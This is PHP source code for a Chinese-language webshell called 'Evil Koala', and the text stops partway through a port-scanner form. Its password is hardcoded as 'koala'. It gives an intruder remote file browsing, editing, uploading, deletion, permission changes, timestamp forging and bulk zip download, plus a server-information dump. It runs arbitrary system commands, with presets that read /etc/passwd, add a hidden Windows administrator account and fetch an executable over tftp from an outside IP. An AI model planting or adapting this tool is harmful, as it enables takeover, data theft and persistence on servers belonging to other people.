<?php
/**
 * @name：邪恶考拉webshell
 * @author：magicming
 * @version：1.0
 */
error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
set_time_limit(0);
$password = "koala";


function getRoot(&$array){
	while(list($key,$var) = each($array)){
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv'){
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = getRoot($var);  
		}
	}
	return $array;
}


/**
 * 文件管理类文件
 * @param string $classname 类名
 * @return mixed
 */
class packCatalog{
	var $out='';
	var $datasec=array();
	var $ctrl_dir=array();
	var $eof_ctrl_dir="\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset=0;
	
	function packCatalog($array){
		if(@function_exists('gzcompress')){
			for($n = 0;$n < count($array);$n++){
				$array[$n] = urldecode($array[$n]);
				$fp = @fopen($array[$n], 'r');
				$filecode = @fread($fp, @filesize($array[$n]));
				@fclose($fp);
				$this -> filezip($filecode,basename($array[$n]));
			}
		@closedir($zhizhen);
		$this->out = $this->packfile();
		return true;
	}
	return false;
	}
	
	function at($atunix = 0){
		$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
		if ($unixarr['year'] < 1980)
		{
			$unixarr['year']    = 1980;
			$unixarr['mon']     = 1;
			$unixarr['mday']    = 1;
			$unixarr['hours']   = 0;
			$unixarr['minutes'] = 0;
			$unixarr['seconds'] = 0;
		} 
		return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
	}
	
	
	function filezip($data, $name, $time = 0){
		$name = str_replace('\\', '/', $name);
		$dtime = dechex($this->at($time));
		$hexdtime	= '\x'.$dtime[6].$dtime[7].'\x'.$dtime[4].$dtime[5].'\x'.$dtime[2].$dtime[3].'\x'.$dtime[0].$dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	
	function packfile(){
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
	}
}


function fileStrReplace($string){
	return str_replace('//','/',str_replace('\\','/',$string));
}


function getFileSize($size){
	if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
	elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
	elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
	else $size = $size . ' B';
	return $size;
}


function getFileMode(){
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return fileStrReplace(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}


function fileRead($filename){
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}


function fileWrite($filename,$filecode,$filemode){
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode)){
		@chmod($filename,0666);
		$key = @fwrite($handle,$filecode) ? true : false;
	}
@fclose($handle);
return $key;
}


function fileMove($filea,$fileb){
	$key = @copy($filea,$fileb) ? true : false;
	if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;
	return $key;
}


function fileDownload($filename){
	if(!file_exists($filename)) return false;
	$filedown = basename($filename);
	$array = explode('.', $filedown);
	$arrayend = array_pop($array);
	header('Content-type: application/x-'.$arrayend);
	header('Content-Disposition: attachment; filename='.$filedown);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}


function fileDelTree($deldir){
	if(($mydir = @opendir($deldir)) == NULL) return false;	
	while(false !== ($file = @readdir($mydir))){
		$name = fileStrReplace($deldir.'/'.$file);
		if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);fileDelTree($name);}
		if(is_file($name)){@chmod($name,0777);@unlink($name);}
	} 
	@closedir($mydir);
	@chmod($deldir,0777);
	return @rmdir($deldir) ? true : false;
}


function fileDo($array,$actall,$inver){
	if(($count = count($array)) == 0) return '请选择文件';
	if($actall == 'e'){
		$zip = new packCatalog;
		if($zip->packCatalog($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
		return '打包文件失败';
	}
	$i = 0;
	while($i < $count){
		$array[$i] = urldecode($array[$i]);
		switch($actall){
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],fileStrReplace($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
		}
		$i++;
	}
	return '所选文件'.$msg.'完毕';
}


function fileEdit($filepath,$filename,$dim = ''){
	$THIS_DIR = urlencode($filepath);
	$THIS_FILE = fileStrReplace($filepath.'/'.$filename);
	if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(fileRead($THIS_FILE));}
	else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
print<<<END
<script language="javascript">
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById('mtime').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
	else{document.getElementById('editor').submit();}
}
</script>
文件内容：
<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
<div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">文件修改时间 <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
<div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;">
<input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
</form>
END;
}


function fileUpload($p){
	$THIS_DIR = urlencode($p);
	$UP_SIZE = get_cfg_var('upload_max_filesize');
	$MSG_BOX = '单个文件允许大小:'.$UP_SIZE.', 改名格式(xx.jpg),如为空,则保持原文件名';
	if(!empty($_POST['updir']))
	{
		if(count($_FILES['soup']) >= 1)
		{
			$i = 0;
			foreach ($_FILES['soup']['error'] as $key => $error)
			{
				if ($error == UPLOAD_ERR_OK)
				{
					$souptmp = $_FILES['soup']['tmp_name'][$key];
					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
					$MSG[$i] = fileMove($souptmp,fileStrReplace($_POST['updir'].'/'.$soupname)) ? $soupname.'上传成功' : $soupname.'上传失败';
				}
				$i++;
			}
		}
		else
		{
			$MSG_BOX = '请选择文件';
		}
	}
print<<<END
<div style="color:#866e43;">提示：{$MSG_BOX}</div>
<form method="POST" id="editor" action="?s=q&p={$THIS_DIR}" enctype="multipart/form-data">
<div class="actall">上传到目录: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
<div class="actall">文件1 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
<div class="actall">文件2 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
<div class="actall">文件3 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
<div class="actall">文件4 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
<div class="actall">文件5 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
<div class="actall">文件6 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
<div class="actall">文件7 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
<div class="actall">文件8 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
<div class="actall"><input type="submit" value="批量上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
</form>
END;
}


function fileManage($p){
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$MSG_BOX = '等待消息队列';
	$UP_DIR = urlencode(fileStrReplace($p.'/..'));
	$REAL_DIR = fileStrReplace(realpath($p));
	$FILE_DIR = fileStrReplace(dirname(__FILE__));
	$ROOT_DIR = getFileMode();
	$THIS_DIR = urlencode(fileStrReplace($REAL_DIR));
	$NUM_D = 0;
	$NUM_F = 0;
	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = fileWrite($_POST['pfn'],$_POST['pfc'],'wb') ? '编辑文件 '.$_POST['pfn'].' 成功' : '编辑文件 '.$_POST['pfn'].' 失败';@touch($_POST['pfn'],$intime);}
	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = fileMove($_FILES['ufp']['tmp_name'],fileStrReplace($REAL_DIR.'/'.$upfilename)) ? '上传文件 '.$upfilename.' 成功' : '上传文件 '.$upfilename.' 失败';}
	if(!empty($_POST['actall'])){$MSG_BOX = fileDo($_POST['files'],$_POST['actall'],$_POST['inver']);}
	if(isset($_GET['md'])){$modfile = fileStrReplace($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = '属性值错误'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? '修改 '.$modfile.' 属性为 '.$_GET['md'].' 成功' : '修改 '.$modfile.' 属性为 '.$_GET['md'].' 失败';}
	if(isset($_GET['mn'])){$MSG_BOX = @rename(fileStrReplace($REAL_DIR.'/'.$_GET['mn']),fileStrReplace($REAL_DIR.'/'.$_GET['rn'])) ? '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 成功' : '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 失败';}
	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(fileStrReplace($REAL_DIR.'/'.$_GET['dn']),0777) ? '创建目录 '.$_GET['dn'].' 成功' : '创建目录 '.$_GET['dn'].' 失败';}
	if(isset($_GET['dd'])){$MSG_BOX = fileDelTree($_GET['dd']) ? '删除目录 '.$_GET['dd'].' 成功' : '删除目录 '.$_GET['dd'].' 失败';}
	if(isset($_GET['df'])){if(!fileDownload($_GET['df'])) $MSG_BOX = '下载文件不存在';}
	mainCSS();
print<<<END
<script type="text/javascript">
	function Inputok(msg,gourl)
	{
		smsg = "当前文件:[" + msg + "]";
		re = prompt(smsg,unescape(msg));
		if(re)
		{
			var url = gourl + escape(re);
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "确定要删除[" + unescape(msg) + "]吗?";
		if(confirm(smsg))
		{
			if(gourl == 'b')
			{
				document.getElementById('actall').value = escape(gourl);
				document.getElementById('fileall').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "当前文件时间:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != 'chkall')
			e.checked = form.chkall.checked;
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById('actall').value = actid;
			document.getElementById('inver').value = escape(re);
			document.getElementById('fileall').submit();
		}
	}
</script>
<!--<div id="msgbox" class="msgbox">{$MSG_BOX}</div>-->
<div class="actall" style="text-align:center;padding:3px;">
<form method="GET"><input type="hidden" id="s" name="s" value="a">
<input type="text" name="p" value="{$REAL_DIR}" style="width:550px;height:22px;">
<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
	<option>---常用目录---</option>
	<option value="{$ROOT_DIR}">网站根目录</option>
	<option value="{$FILE_DIR}">本程序目录</option>
	<option value="C:/">C盘</option>
	<option value="D:/">D盘</option>
	<option value="E:/">E盘</option>
	<option value="F:/">F盘</option>
	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动">启动项</option>
	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup">启动项(英)</option>
	<option value="C:/RECYCLER">回收站</option>
	<option value="C:/Program Files">Programs</option>
	<option value="/etc">etc</option>
	<option value="/home">home</option>
	<option value="/usr/local">Local</option>
	<option value="/tmp">Temp</option>
</select><input type="submit" value="转到" style="width:50px;"></form>
<div style="margin-top:3px;"></div>
<form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
	<input type="button" value="新建文件" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
	<input type="button" value="新建目录" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
	<input type="button" value="批量上传" onclick="window.location='?s=q&p={$REAL_DIR}';"> 
	<input type="file" name="ufp" style="width:300px;height:22px;">
	改名：<input type="text" name="ufn" style="width:121px;height:22px;">
	<input type="submit" value="上传文件" style="width:60px;">
</form></div>
<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}">
<table border="0"><tr><td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>↑上级目录↑</b></a></td>
<td class="toptd" style="width:80px;"> 文件操作 </td><td class="toptd" style="width:60px;"> 文件属性 </td><td class="toptd" style="width:173px;"> 文件修改时间 </td><td class="toptd" style="width:75px;"> 文件大小 </td></tr>
END;
	if(($h_d = @opendir($p)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = fileStrReplace($REAL_DIR.'/'.$Filename);
		if(is_dir($Filepath))
		{
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filepath = urlencode($Filepath);
			echo "\r\n".' <tr><td> <a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
			$Filename = urlencode($Filename);
			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> 删除 </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td> ';
			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td> </td> </tr>'."\r\n";
			$NUM_D++;
		}
	}
	@rewinddir($h_d);
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = fileStrReplace($REAL_DIR.'/'.$Filename);
		if(!is_dir($Filepath))
		{
			$Fileurls = str_replace(fileStrReplace($ROOT_DIR.'/'),$GETURL,$Filepath);
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filesize = getFileSize(@filesize($Filepath));
			if($Filepath == fileStrReplace(__FILE__)) $fname = '<font color="#8B0000">'.$Filename.'</font>'; else $fname = $Filename;
			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
			$Filepath = urlencode($Filepath);
			$Filename = urlencode($Filename);
			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> 编辑 </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td>';
			echo ' <td>'.$Fileperm.'</td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n";
			$NUM_F++;
		}
	}
	@closedir($h_d);
	if(!$Filetime) $Filetime = '2009-01-01 00:00:00';
print<<<END
</table>
<div style="margin-top:5px;margin-left:3px;"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$THIS_DIR}','a');return false;"> 
<input type="button" value="删除" onclick="Delok('所选文件','b');return false;"> 
<input type="button" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;"> 
<input type="button" value="时间" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','silic.gz','e');return false;"> 
目录({$NUM_D}) / 文件({$NUM_F})</div> 
</form> 
END;
	return true;
}


/**
 * 搜索文件函数
 */
function searchFileRecursion($sfp,$sfc,$sft,$sff,$sfb){
	if(($h_d = @opendir($sfp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d))){
		if($Filename == '.' || $Filename == '..') continue;
		if(eregi($sft,$Filename)) continue;
		$Filepath = fileStrReplace($sfp.'/'.$Filename);
		if(is_dir($Filepath) && $sfb) searchFileRecursion($Filepath,$sfc,$sft,$sff,$sfb);
		if($sff){
			if(stristr($Filename,$sfc)){
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
		else{
			$File_code = fileRead($Filepath);
			if(stristr($File_code,$sfc)){
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
	}
	@closedir($h_d);
	return true;
}


function searchFile(){
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : getFileMode();
	$SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config';
	$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';
print<<<END
<form method="POST" name="jform" id="jform" action="?s=searchfile">
<div class="actall">查找路径：<input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">过滤扩展名：<input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
<div class="actall">关键字：<input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
<input type="radio" name="sff" value="a" checked>查找文件名 
<input type="radio" name="sff" value="b">查找包含文字</div>
<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>搜索本级目录及下级所有子目录
<br><input type="radio" name="sfb" value="b">仅搜索本级目录</div>
<div class="actall"><input type="submit" value="开始搜索" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['sfp'])) && (!empty($_POST['sfc']))){
		echo '<div class="actall">';
		$_POST['sft'] = str_replace('.','\\.',$_POST['sft']);
		$sff = ($_POST['sff'] == 'a') ? true : false;
		$sfb = ($_POST['sfb'] == 'a') ? true : false;
		echo searchFileRecursion($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '搜索完毕' : '异常终止';
		echo '</div>';
	}
	return true;
}


/**
 * 读取配置值
 */
function getCfgVar($varname){
	switch($result = get_cfg_var($varname)){
		case 0: return "No"; break; 
		case 1: return "Yes"; break; 
		default: return $result; break;
	}
}


function exsitFun($funName){
	return (false !== function_exists($funName)) ? "Yes" : "No";
}


/**
 * 读取系统信息函数
 */
function sysInfo(){
	$dis_func = get_cfg_var("disable_functions");
	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
	$info = array(
		array("服务器日期",date("Y年m月d日 h:i:s",time())),
		array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
		array("服务器IP",gethostbyname($_SERVER['SERVER_NAME'])),
		array("服务器操作系统",PHP_OS),
		array("服务器系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
		array("您的IP",getenv('REMOTE_ADDR')),
		array("Web服务端口",$_SERVER['SERVER_PORT']),
		array("PHP运行方式",strtoupper(php_sapi_name())),
		array("PHP版本",PHP_VERSION),
		array("运行于安全模式",getCfgVar("safemode")),
		array("服务器管理员",$adminmail),
		array("本文件路径",__FILE__),
		array("允许使用 URL 打开文件 allow_url_fopen",getCfgVar("allow_url_fopen")),
		array("允许动态加载链接库 enable_dl",getCfgVar("enable_dl")),
		array("显示错误信息 display_errors",getCfgVar("display_errors")),
		array("自动定义全局变量 register_globals",getCfgVar("register_globals")),
		array("magic_quotes_gpc",getCfgVar("magic_quotes_gpc")),
		array("程序最多允许使用内存量 memory_limit",getCfgVar("memory_limit")),
		array("POST最大字节数 post_max_size",getCfgVar("post_max_size")),
		array("允许最大上传文件 upload_max_filesize",$upsize),
		array("程序最长运行时间 max_execution_time",getCfgVar("max_execution_time")."秒"),
		array("被禁用的函数 disable_functions",$dis_func),
		array("phpinfo()",$phpinfo),
		array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
		array("图形处理 GD Library",exsitFun("imageline")),
		array("IMAP电子邮件系统",exsitFun("imap_close")),
		array("MySQL数据库",exsitFun("mysql_close")),
		array("SyBase数据库",exsitFun("sybase_close")),
		array("Oracle数据库",exsitFun("ora_close")),
		array("Oracle 8 数据库",exsitFun("OCILogOff")),
		array("PREL相容语法 PCRE",exsitFun("preg_match")),
		array("PDF文档支持",exsitFun("pdf_close")),
		array("Postgre SQL数据库",exsitFun("pg_close")),
		array("SNMP网络管理协议",exsitFun("snmpget")),
		array("压缩文件支持(Zlib)",exsitFun("gzclose")),
		array("XML解析",exsitFun("xml_set_object")),
		array("FTP",exsitFun("ftp_login")),
		array("ODBC数据库连接",exsitFun("odbc_close")),
		array("Session支持",exsitFun("session_start")),
		array("Socket支持",exsitFun("fsockopen")),
	);
	echo '<table width="100%" border="0">';
	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
	echo '</table>';
	return true;
}


/**
 * 执行系统命令核心函数
 */
function exeCmdCore($cmd){
	$res = '';
	if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
	elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}
	elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
	return $res;
}


/**
 * 执行系统命令函数
 */
function exeCmd(){
	$res = '回显';
	$cmd = 'dir';
	if(!empty($_POST['cmd'])){$res = exeCmdCore($_POST['cmd']);$cmd = $_POST['cmd'];}
print<<<END
<script language="javascript">
function sFull(i){
	Str = new Array(14);
	Str[0] = "dir";
	Str[1] = "ls /etc";
	Str[2] = "cat /etc/passwd";
	Str[3] = "cp -a /home/www/html/a.php /home/www2/";
	Str[4] = "uname -a";
	Str[5] = "gcc -o /tmp/silic /tmp/silic.c";
	Str[6] = "net user silic silic /add & net localgroup administrators silic /add";
	Str[7] = "net user";
	Str[8] = "netstat -an";
	Str[9] = "ipconfig";
	Str[10] = "copy c:\\1.php d:\\2.php";
	Str[11] = "tftp -i 123.234.222.1 get silic.exe c:\\silic.exe";
	Str[12] = "lsb_release -a";
	Str[13] = "chmod 777 /tmp/silic.c";
document.getElementById('cmd').value = Str[i];
return true;
}
</script>
<form method="POST" name="gform" id="gform" action="?s=execmd"><center><div class="actall">
命令参数 <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:399px;">
<select onchange='return sFull(options[selectedIndex].value)'>
<option value="0" selected>--常用命令--</option>
<option value="1">文件列表</option>
<option value="2">读取配置</option>
<option value="3">拷贝文件</option>
<option value="4">系统信息</option>
<option value="5">编译文件</option>
<option value="6">添加管理</option>
<option value="7">用户列表</option>
<option value="8">查看端口</option>
<option value="9">查看地址</option>
<option value="10">复制文件</option>
<option value="11">FTP下载</option>
<option value="12">内核版本</option>
<option value="13">更改属性</option>
</select>
<input type="submit" value="执行" style="width:80px;"></div>
<div class="actall"><textarea name="show" style="width:660px;height:399px;">{$res}</textarea></div></center></form>
END;
return true;
}


/**
 * 扫描端口函数
 */
function scanPort(){
	$Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';
	$Port_port = isset($_POST['port']) ? $_POST['port'] : '21|22|23|25|69|80|110|135|139|443|1433|1521|3306|3389|7001|8080|43958';
print<<<END
<form method="POST" name="iform" id="iform" action="?s=scanport">
<div class="actall">I P：&nbsp;&nbsp;<input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
